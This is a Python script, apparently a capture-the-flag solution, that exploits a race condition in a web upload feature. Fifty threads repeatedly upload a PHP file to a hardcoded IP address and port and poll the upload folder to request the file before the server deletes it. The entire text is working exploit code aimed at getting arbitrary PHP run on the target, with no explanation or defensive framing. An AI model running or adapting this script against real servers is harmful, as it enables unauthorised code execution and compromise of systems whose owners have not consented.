import os
import requests
import threading

class RaceCondition(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.url = 'http://61.147.171.105:51065/upload/info.php'
        self.upload_url = 'http://61.147.171.105:51065/upload.php'

    def _get(self):
        print('try to call uploaded file...')
        r = requests.get(self.url)
        if r.status_code == 200:
            print('[*] create file info.php success.')
            os._exit(0)

    def _upload(self):
        print('upload file...')
        file = {
            'file': open('info.php', 'r')
        }
        requests.post(self.upload_url, files = file)

    def run(self):
        while True:
            for i in range(5):
                self._get()

            for i in range(10):
                self._upload()
                self._get()

if __name__ == '__main__':
    threads = 50    

    for i in range(threads):
        t = RaceCondition()
        t.start()

    for i in range(threads):
        t.join()